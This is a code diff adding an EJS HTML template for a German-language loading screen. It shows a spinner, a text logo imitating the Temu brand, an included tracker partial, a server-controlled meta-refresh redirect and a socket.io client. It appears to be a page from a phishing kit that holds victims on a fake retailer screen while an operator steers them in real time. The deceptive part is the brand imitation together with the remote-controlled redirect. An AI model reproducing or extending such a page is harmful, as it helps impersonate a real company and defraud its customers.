@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <%- include('partials/tracker') %>
+    <meta http-equiv="refresh" content="<%=time%>; url=<%=url%>">
+    <link rel="stylesheet" href="./css/bratoka.css">
+    <style>
+      .spinner {
+        border: 12px solid #f3f3f3;
+        border-top: 12px solid #ff7300;
+        border-radius: 50%;
+        width: 80px;
+        height: 80px;
+        animation: spin 1.6s linear infinite;
+        margin: 20px auto;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      .loading-text {
+        font-size: 1.2em;
+        margin-top: 10px;
+        text-align: center;
+        color: #333;
+      }
+
+      .loading {
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+      }
+
+      @media (max-width: 668px) {
+        .spinner {
+          width: 60px;
+          height: 60px;
+          border-radius: 50%;
+          border: 10px solid #f3f3f3;
+          border-top: 10px solid #ff7300;
+        }
+
+        .loading-text {
+          font-size: 15px;
+        }
+
+      }
+
+      .topano2 {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .topano2 img {
+        width: 100%;
+      }
+
+      .pc {
+        display: none;
+      }
+
+      .mb {
+        display: block;
+      }
+
+      @media (min-width: 768px) {
+        .pc {
+          display: block;
+        }
+
+        .mb {
+          display: none;
+        }
+      }
+    </style>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"
+      integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+</head>
+
+<body>
+  <div class="temu-header-container">
+    <div class="temu-logo">temu</div>
+  </div>
+
+  <div class="loading">
+    <div class="spinner"></div>
+    <div class="loading-text">Bitte warten, wird geladen...</div>
+  </div>
+
+
+  <script src="/socket.io/socket.io.js"></script>
+
+</body>
+
+</html>
